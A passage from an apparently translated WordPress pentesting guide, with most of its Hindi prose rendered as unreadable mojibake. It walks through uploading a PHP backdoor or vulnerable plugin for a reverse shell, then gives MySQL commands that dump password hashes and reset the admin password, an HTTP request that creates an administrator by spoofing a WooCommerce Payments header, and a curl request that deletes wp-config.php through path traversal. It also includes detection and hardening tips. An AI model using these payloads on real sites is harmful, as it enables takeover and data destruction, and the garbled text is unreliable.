рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдкрдирд╛ php backdoor рдмрдирд╛рдПрдВ:

![](<../../images/image (183).png>)

рдлрд┐рд░ рдПрдХ рдирдпрд╛ plugin рдЬреЛрдбрд╝реЗрдВ:

![](<../../images/image (722).png>)

Plugin рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдФрд░ Install Now рджрдмрд╛рдПрдБ:

![](<../../images/image (249).png>)

Procced рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ:

![](<../../images/image (70).png>)

рд╢рд╛рдпрдж рдЗрд╕рд╕реЗ рдХреБрдЫ рднреА рдирд╣реАрдВ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдЖрдк Media рдореЗрдВ рдЬрд╛рдПрдБ рддреЛ рдЖрдк рдЕрдкрдирд╛ shell рдЕрдкрд▓реЛрдб рд╣реБрдЖ рджреЗрдЦреЗрдВрдЧреЗ:

![](<../../images/image (462).png>)

рдЗрд╕реЗ access рдХрд░реЗрдВ рдФрд░ рдЖрдк reverse shell execute рдХрд░рдиреЗ рдХрд╛ URL рджреЗрдЦреЗрдВрдЧреЗ:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

рдпрд╣ рддрд░реАрдХрд╛ рдПрдХ рдРрд╕реА malicious plugin рдХреА installation рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬрд┐рд╕реЗ vulnerable рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрд┐рд╕рдХрд╛ exploit рдХрд░рдХреЗ web shell рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ WordPress dashboard рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреА рдЬрд╛рддреА рд╣реИ:

1. **Plugin Acquisition**: Plugin рдХреЛ Exploit DB рдЬреИрд╕реЗ рд╕реНрд░реЛрдд рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress dashboard рдкрд░ рдЬрд╛рдПрдБ, рдлрд┐рд░ `Dashboard > Plugins > Upload Plugin` рдкрд░ рдЬрд╛рдПрдБред
- рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП plugin рдХреА zip рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред
3. **Plugin Activation**: рдПрдХ рдмрд╛рд░ plugin рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ install рд╣реЛ рдЬрд╛рдиреЗ рдкрд░, рдЗрд╕реЗ dashboard рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ activate рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
4. **Exploitation**:
- рдЬрдм "reflex-gallery" plugin install рдФрд░ activate рд╣реЛ, рддреЛ рдЗрд╕реЗ exploit рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ vulnerable рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред
- Metasploit framework рдЗрд╕ vulnerability рдХреЗ рд▓рд┐рдП рдПрдХ exploit рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдЙрдкрдпреБрдХреНрдд module рд▓реЛрдб рдХрд░рдХреЗ рдФрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрдорд╛рдВрдбреНрд╕ execute рдХрд░рдХреЗ рдПрдХ meterpreter session рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ site рдкрд░ unauthorized access рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред
- рдпрд╣ рдХреЗрд╡рд▓ WordPress рд╕рд╛рдЗрдЯ рдХреЛ exploit рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред

рд╕рд╛рдордЧреНрд░реА рдореЗрдВ WordPress dashboard рдореЗрдВ plugin install рдФрд░ activate рдХрд░рдиреЗ рдХреЗ рдЪрд░рдгреЛрдВ рдХреЛ рджрд░реНрд╢рд╛рддреЗ рд╣реБрдП рджреГрд╢реНрдп рд╕рдВрджрд░реНрдн рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рдзреНрдпрд╛рди рд░рдЦрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ рдмрд┐рдирд╛ рдЙрдЪрд┐рдд рдЕрдиреБрдорддрд┐ рдХреЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ vulnerabilities рдХрд╛ exploit рдХрд░рдирд╛ рдЕрд╡реИрдз рдФрд░ рдЕрдиреИрддрд┐рдХ рд╣реИред рдпрд╣ рдЬрд╛рдирдХрд╛рд░реА рдЬрд╝рд┐рдореНрдореЗрджрд╛рд░реА рд╕реЗ рдФрд░ рдХреЗрд╡рд▓ рдХрд╛рдиреВрдиреА рд╕рдВрджрд░реНрдн рдореЗрдВ рд╣реА рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП, рдЬреИрд╕реЗ рдХрд┐ penetration testing рдЬрдм рд╕реНрдкрд╖реНрдЯ рдЕрдиреБрдорддрд┐ рд╣реЛред

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬреЛ **Cross-Site Scripting (XSS)** vulnerability рдХреЛ **Remote Code Execution (RCE)** рдпрд╛ рдЕрдиреНрдп critical vulnerabilities рдореЗрдВ escalate рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХреА рдЧрдИ рд╣реИ WordPress рдореЗрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html) рджреЗрдЦреЗрдВред рдпрд╣ **Wordpress Versions 6.X.X, 5.X.X and 4.X.X** рдХреЗ рд▓рд┐рдП рд╕рдкреЛрд░реНрдЯ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
- _**Privilege Escalation:**_ WordPress рдореЗрдВ рдПрдХ user рдмрдирд╛рддрд╛ рд╣реИред
- _**(RCE) Custom Plugin (backdoor) Upload:**_ рдЕрдкрдирд╛ custom plugin (backdoor) WordPress рдкрд░ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВред
- _**(RCE) Built-In Plugin Edit:**_ WordPress рдореЗрдВ Built-In Plugins рдХреЛ edit рдХрд░реЗрдВред
- _**(RCE) Built-In Theme Edit:**_ WordPress рдореЗрдВ Built-In Themes рдХреЛ edit рдХрд░реЗрдВред
- _**(Custom) Custom Exploits:**_ Third-Party WordPress Plugins/Themes рдХреЗ рд▓рд┐рдП custom exploitsред

## Post Exploitation

рдпреВрдЬрд╝рд░рдиреЗрдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рдХрд╛рд▓реЗрдВ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
admin password рдмрджрд▓реЗрдВ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### рд╣рдорд▓реЗ рдХреА рд╕рддрд╣

рдХрд┐рд╕ рддрд░рд╣ рдПрдХ Wordpress plugin рдлрд╝рдВрдХреНрд╢рдиреИрд▓рд┐рдЯреА рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрд╣ рдЬрд╛рдирдирд╛ рдЙрд╕рдХреА functionality рдореЗрдВ vulnerabilities рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрд╣рдо рд╣реИред рдЖрдк рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдмреБрд▓реЗрдЯ рдкреЙрдЗрдВрдЯреНрд╕ рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ plugin рдХрд┐рд╕ рддрд░рд╣ functionality рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХреБрдЫ vulnerable plugins рдХреЗ рдЙрджрд╛рд╣рд░рдг [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) рдореЗрдВ рджрд┐рдП рдЧрдП рд╣реИрдВред

- **`wp_ajax`**

рдПрдХ plugin рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ AJAX handlers рдХреЗ рдЬрд░рд┐рдП рд╣реЛрддрд╛ рд╣реИред рдЗрдирдореЗрдВ рд▓реЙрдЬрд┐рдХ, authorization, рдпрд╛ authentication bugs рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЕрдХреНрд╕рд░ рдпреЗ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ authentication рдФрд░ authorization рджреЛрдиреЛрдВ рдХреЛ wordpress nonce рдХреА рдореМрдЬреВрджрдЧреА рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдХрд░ рджреЗрддреЗ рд╣реИрдВ, рдЬреЛ **Wordpress instance рдореЗрдВ authenticated рдХрд┐рд╕реА рднреА user рдХреЗ рдкрд╛рд╕ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ** (рдЪрд╛рд╣реЗ рдЙрд╕рдХреА role рдХреЛрдИ рднреА рд╣реЛ)ред

рдпреЗ рд╡реЗ functions рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ plugin рдореЗрдВ рдХрд┐рд╕реА function рдХреЛ рдПрдХреНрд╕рдкреЛрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv`` рдХрд╛ рдЙрдкрдпреЛрдЧ endpoint рдХреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдЕрдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ) рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдБрдЪ рдпреЛрдЧреНрдп рдмрдирд╛ рджреЗрддрд╛ рд╣реИред**

> [!CAUTION]
> рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЗрд╡рд▓ `wp_verify_nonce` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЗрд╡рд▓ рдпрд╣ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд▓реЙрдЧ рдЗрди рд╣реИ; рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рднреВрдорд┐рдХрд╛ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рддрд╛ред рдЗрд╕рд▓рд┐рдП рдХрдо-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЙрдЪреНрдЪ-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реА рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдкрд╣реБрдБрдЪ рдорд┐рд▓ рд╕рдХрддреА рд╣реИред

- **REST API**

рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ wordpress рдореЗрдВ `register_rest_route` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ functions рдХреЛ expose рдХрд┐рдпрд╛ рдЬрд╛рдП:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` рдПрдХ callback рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬреЛ рдЬрд╛рдБрдЪ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рджрд┐рдпрд╛ рдЧрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ API method рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдзрд┐рдХреГрдд рд╣реИ рдпрд╛ рдирд╣реАрдВред

**If the built-in `__return_true` function is used, it'll simply skip user permissions check.**

- **Direct access to the php file**

рдмреЗрд╢рдХ, Wordpress PHP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ plugins рдХреЗ рдЕрдВрджрд░ рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╡реЗрдм рд╕реЗ рд╕реАрдзреЗ рд╕реБрд▓рдн рд╣реЛрддреА рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдХреЛрдИ plugin рдРрд╕реА рдХреЛрдИ vulnerable functionality рдЙрдЬрд╛рдЧрд░ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреЛ рдХреЗрд╡рд▓ рдлрд╝рд╛рдЗрд▓ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рд╣реЛ рдЬрд╛рддреА рд╣реИ, рддреЛ рд╡рд╣ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ exploitable рд╣реЛрдЧреАред

### Trusted-header REST impersonation (WooCommerce Payments тЙд 5.6.1)

рдХреБрдЫ plugins internal integrations рдпрд╛ reverse proxies рдХреЗ рд▓рд┐рдП тАЬtrusted headerтАЭ рд╢реЙрд░реНрдЯрдХрдЯ рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЙрд╕ header рдХрд╛ рдЙрдкрдпреЛрдЧ REST requests рдХреЗ рд▓рд┐рдП рд╡рд░реНрддрдорд╛рди user context рд╕реЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВред рдпрджрд┐ рд╡рд╣ header рдХрд┐рд╕реА upstream component рджреНрд╡рд╛рд░рд╛ cryptographically request рдХреЗ рд╕рд╛рде bound рдирд╣реАрдВ рд╣реИ, рддреЛ рдПрдХ attacker рдЙрд╕реЗ spoof рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ privileged REST routes рдХреЛ administrator рдХреЗ рд░реВрдк рдореЗрдВ рд╣рд┐рдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

- Impact: core users REST route рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдирдпрд╛ administrator рдмрдирд╛рдХрд░ unauthenticated privilege escalation to adminред
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (user ID 1 рдХреЛ рдордЬрдмреВрд░ рдХрд░рддрд╛ рд╣реИ тАФ рдЖрдо рддреМрд░ рдкрд░ рдкрд╣рд▓рд╛ administrator account)ред
- Exploited route: `POST /wp-json/wp/v2/users` рдПрдХ elevated role array рдХреЗ рд╕рд╛рдеред

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

- рдкреНрд▓рдЧрдЗрди рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ-рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реЗрдбрд░ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХреГрдд рд╕реНрдерд┐рддрд┐ рд╕реЗ рдореИрдк рдХрд░рддрд╛ рд╣реИ рдФрд░ capability checks рдХреЛ рд╕реНрдХрд┐рдк рдХрд░ рджреЗрддрд╛ рд╣реИред
- WordPress core рдЗрд╕ route рдХреЗ рд▓рд┐рдП `create_users` capability рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИ; рдкреНрд▓рдЧрдЗрди hack рдЗрд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рд╣реЗрдбрд░ рд╕реЗ рд╕реАрдзреЗ рд╡рд░реНрддрдорд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрджрд░реНрдн рд╕реЗрдЯ рдХрд░рдХреЗред

Expected success indicators

- HTTP 201, рдПрдХ JSON рдмреЙрдбреА рдХреЗ рд╕рд╛рде рдЬреЛ рдмрдирд╛рдП рдЧрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рд╡рд┐рд╡рд░рдг рджреЗрддреА рд╣реИред
- рдПрдХ рдирдпрд╛ admin рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ `wp-admin/users.php` рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛ред

Detection checklist

- `getallheaders()`, `$_SERVER['HTTP_...']`, рдпрд╛ рдЙрди vendor SDKs рдХреЗ рд▓рд┐рдП grep рдХрд░реЗрдВ рдЬреЛ рдХрд╕реНрдЯрдо рд╣реЗрдбрд░ рдкрдврд╝рдХрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕рдВрджрд░реНрдн рд╕реЗрдЯ рдХрд░рддреЗ рд╣реИрдВ (рдЙрджрд╛., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- рдЙрди REST registrations рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░реЗрдВ рдЬрд╣рд╛рдБ privileged callbacks рдХреЗ рдкрд╛рд╕ рдордЬрдмреВрдд `permission_callback` рдЪреЗрдХреНрд╕ рдирд╣реАрдВ рд╣реИрдВ рдФрд░ рд╡реЗ рдЕрдиреБрд░реЛрдз рд╣реЗрдбрд░реЛрдВ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реИрдВред
- REST handlers рдХреЗ рдЕрдВрджрд░ core user-management functions (`wp_insert_user`, `wp_create_user`) рдХреЗ рдЙрдкрдпреЛрдЧ рдЦреЛрдЬреЗрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдХреЗрд╡рд▓ рд╣реЗрдбрд░ рдорд╛рдиреЛрдВ рджреНрд╡рд╛рд░рд╛ gated рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

Hardening

- рдХрднреА рднреА рдХреНрд▓рд╛рдЗрдВрдЯ-рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реЗрдбрд░реЛрдВ рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдпрд╛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рди рдирд┐рдХрд╛рд▓реЗред
- рдпрджрд┐ рдПрдХ reverse proxy рдХреЛ identity рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреА рд╣реА рд╣реИ, рддреЛ proxy рдкрд░ рдЯреНрд░рд╕реНрдЯ рд╕рдорд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рдЗрдирдмрд╛рдЙрдВрдб рдХреЙрдкрд┐рдпрд╛рдБ рд╣рдЯрд╛ рджреЗрдВ (рдЙрджрд╛., `unset X-Wcpay-Platform-Checkout-User` at the edge), рдлрд┐рд░ рдПрдХ signed token рдкрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ server-side рдкрд░ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░реЗрдВред
- рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рд╡рд╛рд▓реЗ REST routes рдХреЗ рд▓рд┐рдП `current_user_can()` рдЪреЗрдХреНрд╕ рдФрд░ рдПрдХ рдХрдбрд╝рд╛ `permission_callback` рдЖрд╡рд╢реНрдпрдХ рдХрд░реЗрдВ (`__return_true` рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВ)ред
- рд╣реЗрдбрд░ тАЬimpersonationтАЭ рдХреА рдмрдЬрд╛рдп first-party auth (cookies, application passwords, OAuth) рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдВред

References: рдкреГрд╖реНрда рдХреЗ рдЕрдВрдд рдореЗрдВ рджрд┐рдП рд▓рд┐рдВрдХ рджреЗрдЦреЗрдВ рдЬреЛ рдПрдХ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреЗрд╕ рдФрд░ рд╡реНрдпрд╛рдкрдХ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдкреНрд░рд╕реНрддреБрдд рдХрд░рддреЗ рд╣реИрдВред

### рдЕрдирдкреНрд░рдорд╛рдгреАрдХреГрдд рдордирдорд╛рдирд╛ рдлрд╝рд╛рдЗрд▓ рд╡рд┐рд▓реЛрдкрди via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins рдЕрдХреНрд╕рд░ AJAX handlers рдХреЛ `wp_ajax_` рдФрд░ `wp_ajax_nopriv_` hooks рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕рдкреЛрдЬ рдХрд░рддреЗ рд╣реИрдВред рдЬрдм **_nopriv_** variant рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ **callback рдЕрдирдкреНрд░рдорд╛рдгреАрдХреГрдд рд╡рд┐рдЬрд┐рдЯрд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдБрдЪ рдпреЛрдЧреНрдп рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдХреЛрдИ рднреА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХреНрд░рд┐рдпрд╛ рдЕрддрд┐рд░рд┐рдХреНрдд рд░реВрдк рд╕реЗ рд▓рд╛рдЧреВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП:

1. рдПрдХ **capability check** (рдЙрджрд╛., `current_user_can()` рдпрд╛ рдХрдо рд╕реЗ рдХрдо `is_user_logged_in()`), рдФрд░
2. рдПрдХ **CSRF nonce** рдЬрд┐рд╕реЗ `check_ajax_referer()` / `wp_verify_nonce()` рд╕реЗ рдорд╛рдиреНрдп рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рдФрд░
3. **рдХрдареЛрд░ рдЗрдирдкреБрдЯ sanitisation / validation**ред

The Litho multipurpose theme (< 3.1) рдиреЗ *Remove Font Family* рдлреАрдЪрд░ рдореЗрдВ рдЙрди 3 рдирд┐рдпрдВрддреНрд░рдгреЛрдВ рдХреЛ рднреВрд▓ рдЧрдпрд╛ рдФрд░ рдЕрдВрддрддрдГ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб (рд╕рд░рд▓реАрдХреГрдд) рд╢рд┐рдк рдХрд┐рдпрд╛:
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
рдЗрд╕ рд╕реНрдирд┐рдкреЗрдЯ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рд╕рдорд╕реНрдпрд╛рдПрдБ:

* **рдмрд┐рдирд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкрд╣реБрдБрдЪ** тАУ `wp_ajax_nopriv_` hook рдкрдВрдЬреАрдХреГрдд рд╣реИред
* **рдХреЛрдИ nonce / capability check рдирд╣реАрдВ** тАУ рдХреЛрдИ рднреА рд╡рд┐рдЬрд╝рд┐рдЯрд░ endpoint рдХреЛ рд╣рд┐рдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **рдХреЛрдИ path sanitisation рдирд╣реАрдВ** тАУ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рдирд┐рдпрдВрддреНрд░рд┐рдд `fontfamily` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдмрд┐рдирд╛ рдлрд╝рд┐рд▓реНрдЯрд░рд┐рдВрдЧ рдХреЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдкрде рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝ рджреА рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреНрд▓рд╛рд╕рд┐рдХ `../../` traversal рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред

#### Exploitation

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХрд▓ HTTP POST request рднреЗрдЬрдХрд░ **uploads base directory рдХреЗ рдиреАрдЪреЗ** (рдЖрдо рддреМрд░ рдкрд░ `<wp-root>/wp-content/uploads/`) рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЛ рд╣рдЯрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рд╡рд┐рдЬрд╝рд╛рд░реНрдб* on the next visit, enabling a full site take-over (рд╣рдорд▓рд╛рд╡рд░ рдХреЗрд╡рд▓ рдПрдХ рдирдпрд╛ DB configuration рджреЗрддрд╛ рд╣реИ рдФрд░ рдПрдХ admin рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рддрд╛ рд╣реИ).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### рдбрд┐рдЯреЗрдХреНрд╢рди рдЪреЗрдХрд▓рд┐рд╕реНрдЯ

* рдХреЛрдИ рднреА `add_action( 'wp_ajax_nopriv_...')` callback рдЬреЛ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рд╣реЗрд▓реНрдкрд░реНрд╕ (`copy()`, `unlink()`, `$wp_filesystem->delete()`, рдЖрджрд┐) рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реЛред
